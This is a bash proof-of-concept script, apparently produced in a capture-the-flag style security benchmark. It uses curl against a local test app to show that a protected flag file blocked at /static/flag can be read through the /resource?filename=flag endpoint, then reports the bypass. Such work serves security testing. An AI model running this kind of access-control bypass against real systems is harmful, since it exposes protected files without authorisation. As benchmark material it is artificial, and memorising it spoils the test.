#!/bin/bash
# POC: Demonstrates access control bypass by accessing protected flag file through /resource endpoint instead of /static/flag
# Target: ./repo
# Created: 2025-11-10T14:47:10.136Z
# Session: benchmark-XBEN-019-24-mht8ykib

# Access Control Bypass POC - /resource Endpoint
# This script demonstrates that protected files can be accessed via the /resource endpoint
# even though they are restricted when accessed directly via /static/

TARGET="http://localhost:8080"

echo "========================================"
echo "Access Control Bypass POC"
echo "========================================"
echo ""

# Test 1: Direct access to /static/flag (should be 403)
echo "[Test 1] Attempting direct access to protected file: /static/flag"
echo "Command: curl -s -w '\nHTTP Status: %{http_code}\n' -i '${TARGET}/static/flag'"
echo ""

RESPONSE1=$(curl -s -w "\n%{http_code}" "${TARGET}/static/flag")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "$BODY1"
echo "HTTP Status: $HTTP_CODE1"
echo ""

if [ "$HTTP_CODE1" = "403" ]; then
    echo "✓ Confirmed: Direct access to /static/flag returns 403 Forbidden"
else
    echo "✗ Unexpected: Expected 403, got $HTTP_CODE1"
fi
echo ""

# Test 2: Access via /resource endpoint (bypass)
echo "[Test 2] Attempting access via /resource endpoint: /resource?filename=flag"
echo "Command: curl -s -w '\nHTTP Status: %{http_code}\n' -i '${TARGET}/resource?filename=flag'"
echo ""

RESPONSE2=$(curl -s -w "\n%{http_code}" "${TARGET}/resource?filename=flag")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "$BODY2"
echo "HTTP Status: $HTTP_CODE2"
echo ""

if [ "$HTTP_CODE2" = "200" ]; then
    echo "✓ Confirmed: Bypass successful - /resource endpoint returns 200 OK"
    echo "✓ VULNERABILITY CONFIRMED: Access control bypass detected"
else
    echo "✗ Unexpected: Expected 200, got $HTTP_CODE2"
fi
echo ""

# Test 3: Compare the responses to confirm it's the same file
echo "[Test 3] Verifying it's the same protected file"
echo "Both requests should indicate they're accessing the 'flag' file"
echo ""

if echo "$BODY2" | grep -q "filename=flag"; then
    echo "✓ Response indicates file serving from bypass endpoint"
fi
echo ""

echo "========================================"
echo "Summary:"
echo "========================================"
echo "Direct Access (/static/flag): HTTP $HTTP_CODE1"
echo "Bypass Access (/resource?filename=flag): HTTP $HTTP_CODE2"
echo ""

if [ "$HTTP_CODE1" = "403" ] && [ "$HTTP_CODE2" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED"
    echo "  The /resource endpoint bypasses access controls on protected files"
    exit 0
else
    echo "✗ Unable to confirm vulnerability"
    exit 1
fi